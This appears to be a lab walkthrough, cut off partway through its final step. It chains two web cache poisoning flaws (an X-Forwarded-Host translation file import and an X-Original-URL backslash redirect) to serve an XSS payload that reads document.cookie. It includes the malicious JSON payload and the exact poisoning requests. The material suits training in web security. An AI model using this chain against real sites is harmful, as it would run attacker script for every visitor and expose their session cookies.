# Affected Components

- Translation loader
- Reverse proxy cache
- X-Forwarded-Host header
- X-Original-URL header

---

# Root Cause

The application trusted the **X-Forwarded-Host** header when constructing URLs for translation files.

The cache also trusted the **X-Original-URL** header and cached redirect responses.

These two implementation flaws could be combined.

---

# Attack Overview

Two different cache entries were poisoned.

## Poison #1

```
GET /?localized=1
```

Purpose:

Serve a malicious translations.json file.

---

## Poison #2

```
GET /
```

Purpose:

Force every English user to visit

```
/setlang/es
```

which eventually loads

```
/?localized=1
```

already poisoned.

---

# Step 1 — Discovering the Translation Import

The home page imports translations dynamically.

The browser loads a JSON file similar to:

```
/resources/json/translations.json
```

The host used to retrieve this file comes from JavaScript variables populated from the HTTP response.

Using Param Miner revealed support for

```
X-Forwarded-Host
```

Changing it caused the page to reference another host.

Example:

```
X-Forwarded-Host: example.com
```

The response now instructed the browser to load

```
https://example.com/resources/json/translations.json
```

---

# Step 2 — Creating the Malicious Translation File

On the exploit server the file path was changed to

```
/resources/json/translations.json
```

Headers:

```
Access-Control-Allow-Origin: *
```

Body:

```json
{
  "en": {
    "name": "English"
  },
  "es": {
    "name": "español",
    "translations": {
      "Return to list":"Volver",
      "View details":"</a><img src=1 onerror='alert(document.cookie)'>",
      "Description:":"Descripción"
    }
  }
}
```

The payload was injected into one translated string.

---

# Step 3 — Poisoning the Spanish Page

The following request was cached.

```
GET /?localized=1
```

Headers:

```
Cookie: lang=es

X-Forwarded-Host:
exploit-XXXX.exploit-server.net
```

Eventually the response returned

```
X-Cache: hit
```

meaning the malicious page had been cached.

Now every Spanish visitor loaded attacker-controlled translations.

---

# Step 4 — Finding the Language Redirect

Changing the language generated

```
GET /setlang/es
```

This response contained

```
Set-Cookie
```

and therefore could not be cached.

However...

---

# Step 5 — Bypassing Cache Restrictions

Using

```
X-Original-URL
```

allowed changing the request path internally.

Instead of requesting

```
/setlang/es
```

the following value was used:

```
X-Original-URL:
/setlang\es
```

Notice the backslash.

The application normalized it into

```
/setlang/es
```

through a

```
302 Redirect
```

Unlike the normal response, this redirect was cacheable.

---

# Step 6 — Poisoning the Redirect

Request:

```
GET /
```

Header:

```
X-Original-URL:
/setlang\es
```

Eventually the cache returned

```
HTTP/2 302

Location:
/setlang/es

X-Cache: hit
```

Now every request to

```
/
```

received the cached redirect.

---

# Step 7 — Full Exploit Chain

Victim visits

```
/
```

↓

